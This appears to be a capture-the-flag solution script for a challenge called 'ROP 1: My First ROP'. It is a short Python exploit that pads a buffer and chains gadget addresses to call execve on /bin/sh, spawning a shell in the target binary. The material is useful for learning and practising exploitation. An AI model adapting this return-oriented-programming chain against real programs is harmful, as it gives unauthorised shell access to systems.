@@ -1,0 +1,46 @@
+Pwn | 108 | ROP 1: My First ROP by Liu Cixin
+
+from __future__ import print_function
+
+import struct
+
+if __name__ == '__main__':
+
+    OFFSET = 8
+    PADDING = 'A' * OFFSET
+    EXECVE = struct.pack('<Q', 59)
+
+    NULL = struct.pack('<Q', 0)
+    FILENAME = struct.pack('<Q', 0x40018f)
+
+    do_syscall = struct.pack('<Q', 0x400184)
+    set_rax = struct.pack('<Q', 0x400187)
+    set_rdi = struct.pack('<Q', 0x400189)
+    set_rsi = struct.pack('<Q', 0x40018b)
+    set_rdx = struct.pack('<Q', 0x40018d)
+
+    print(
+        ''.join([
+            PADDING,
+
+            # set syscall number
+            set_rax,
+            EXECVE,
+
+            # *filename (/bin/sh)
+            set_rdi,
+            FILENAME,
+
+            # argv
+            set_rsi,
+            NULL,
+
+            # envp
+            set_rdx,
+            NULL,
+            do_syscall
+        ]),
+        end='')
+
+
+
